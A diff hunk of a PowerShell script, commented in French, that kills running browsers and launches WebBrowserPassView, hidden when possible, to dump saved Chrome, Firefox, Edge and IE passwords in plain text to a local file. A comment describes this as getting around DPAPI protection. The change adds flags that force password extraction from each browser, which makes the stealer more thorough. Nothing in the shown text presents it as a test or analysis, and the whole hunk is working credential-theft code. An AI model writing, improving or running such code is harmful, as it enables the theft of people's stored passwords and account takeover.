@@ -28,18 +28,18 @@ try {
 Stop-Process -Name "chrome", "msedge", "firefox", "brave" -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 2
 
-# --- CONTOURNEMENT DPAPI : Exécution interactive pour récupérer les mots de passe en clair ---
+# --- CONTOURNEMENT DPAPI ET FORÇAGE DES NAVIGATEURS ---
 $explorer = Get-Process -IncludeUserName | Where-Object {$_.ProcessName -eq "explorer"} | Select-Object -First 1
 
 if ($explorer) {
     $processInfo = New-Object System.Diagnostics.ProcessStartInfo
     $processInfo.FileName = "$basePath\WebBrowserPassView.exe"
-    $processInfo.Arguments = "/stext $basePath\passwords.txt"
+    $processInfo.Arguments = "/LoadPasswordsChrome 1 /LoadPasswordsFirefox 1 /LoadPasswordsIE 1 /stext $basePath\passwords.txt"
     $processInfo.UseShellExecute = $true
     [System.Diagnostics.Process]::Start($processInfo) | Out-Null
     Start-Sleep -Seconds 4
 } else {
-    Start-Process -FilePath "$basePath\WebBrowserPassView.exe" -ArgumentList "/stext $basePath\passwords.txt" -Wait -WindowStyle Hidden
+    Start-Process -FilePath "$basePath\WebBrowserPassView.exe" -ArgumentList "/LoadPasswordsChrome 1 /LoadPasswordsFirefox 1 /LoadPasswordsIE 1 /stext $basePath\passwords.txt" -Wait -WindowStyle Hidden
 }
 
 # Exécution des autres outils avec chemins absolus
